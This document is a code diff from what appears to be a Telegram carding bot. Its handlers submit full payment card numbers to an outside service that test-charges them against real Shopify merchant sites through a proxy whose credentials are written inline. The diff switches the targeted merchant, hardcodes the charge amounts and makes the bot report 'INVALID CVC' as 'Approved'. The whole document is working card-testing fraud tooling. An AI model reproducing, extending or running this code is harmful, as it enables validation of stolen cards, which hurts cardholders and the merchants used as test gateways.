@@ -2736,7 +2736,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://rootsapothecary.com"
+            f"?site=https://lot22oliveoil.com"
             f"&cc={full_card}"
             f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
         )
@@ -2809,7 +2809,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         final_msg = (
             f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 {price}\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝟎.𝟗𝟖$\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
@@ -3048,7 +3048,7 @@ async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         final_msg = (
             f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 {price}\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝟏𝟎$\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
@@ -3561,6 +3561,8 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             header_status = "✅ Approved"
         elif "CARD_DECLINED" in response.upper():
             header_status = "❌ Declined"
+        elif "INVALID CVC" in response.upper():
+            header_status = "✅ Approved"
         elif "INSUFFICIENT_FUNDS" in response.upper():
             display_response += " 💳"
             header_status = "✅ Approved"
